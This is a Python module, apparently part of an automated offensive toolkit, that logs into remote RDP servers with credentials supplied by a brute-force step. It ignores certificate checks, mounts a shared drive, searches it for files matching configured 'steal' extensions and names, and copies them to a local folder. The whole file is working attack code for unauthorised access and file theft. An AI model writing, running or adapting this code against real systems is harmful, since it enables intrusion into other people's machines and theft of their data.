"""
steal_files_rdp.py - This script connects to remote RDP servers using provided credentials, searches for specific files, and downloads them to a local directory.
"""

import os
import subprocess
import logging
from shared import SharedData
from logger import Logger
from actions.base_steal import BaseSteal

logger = Logger(name="steal_files_rdp.py", level=logging.DEBUG)

b_class = "StealFilesRDP"
b_module = "steal_files_rdp"
b_status = "steal_files_rdp"
b_parent = "RDPBruteforce"
b_port = 3389


class StealFilesRDP(BaseSteal):
    protocol_name = "rdp"
    credential_file_attr = "rdpfile"
    default_root_path = "/mnt/shared"

    def connect(self, ip, username, password):
        try:
            if self.shared_data.orchestrator_should_exit:
                logger.info("RDP connection attempt interrupted due to orchestrator exit.")
                return None
            has_xvfb = subprocess.run(['which', 'xvfb-run'], capture_output=True).returncode == 0
            cmd = ['xfreerdp', f'/v:{ip}', f'/u:{username}', f'/p:{password}',
                   '/drive:shared,/mnt/shared', '/cert:ignore', '/bpp:8', '/network:auto', '+compression']
            if has_xvfb:
                cmd = ['xvfb-run', '--auto-servernum'] + cmd
            process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            stdout, stderr = process.communicate()
            if process.returncode == 0:
                logger.info(f"Connected to {ip} via RDP with username {username}")
                self.connected = True
                return process
            else:
                logger.error(f"Error connecting to RDP on {ip} with username {username}: {stderr.decode()}")
                return None
        except Exception as e:
            logger.error(f"Error connecting to RDP on {ip} with username {username}: {e}")
            return None

    def find_items(self, client, dir_path):
        try:
            if self.shared_data.orchestrator_should_exit:
                logger.info("File search interrupted due to orchestrator exit.")
                return []
            files = []
            for root, dirs, filenames in os.walk(dir_path):
                for file in filenames:
                    if any(file.endswith(ext) for ext in self.shared_data.steal_file_extensions) or \
                       any(file_name in file for file_name in self.shared_data.steal_file_names):
                        files.append(os.path.join(root, file))
            logger.info(f"Found {len(files)} matching files in {dir_path}")
            return files
        except Exception as e:
            logger.error(f"Error finding files in directory {dir_path}: {e}")
            return []

    def steal_item(self, conn, remote_file, local_dir):
        try:
            if self.shared_data.orchestrator_should_exit:
                logger.info("File stealing process interrupted due to orchestrator exit.")
                return
            local_file_path = os.path.join(local_dir, os.path.basename(remote_file))
            os.makedirs(os.path.dirname(local_file_path), exist_ok=True)
            cmd = ['cp', remote_file, local_file_path]
            process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            stdout, stderr = process.communicate()
            if process.returncode == 0:
                logger.success(f"Downloaded file from {remote_file} to {local_file_path}")
            else:
                logger.error(f"Error downloading file {remote_file}: {stderr.decode()}")
        except Exception as e:
            logger.error(f"Error stealing file {remote_file}: {e}")

    def disconnect(self, client):
        client.terminate()


if __name__ == "__main__":
    try:
        shared_data = SharedData()
        steal_files_rdp = StealFilesRDP(shared_data)
    except Exception as e:
        logger.error(f"Error in main execution: {e}")
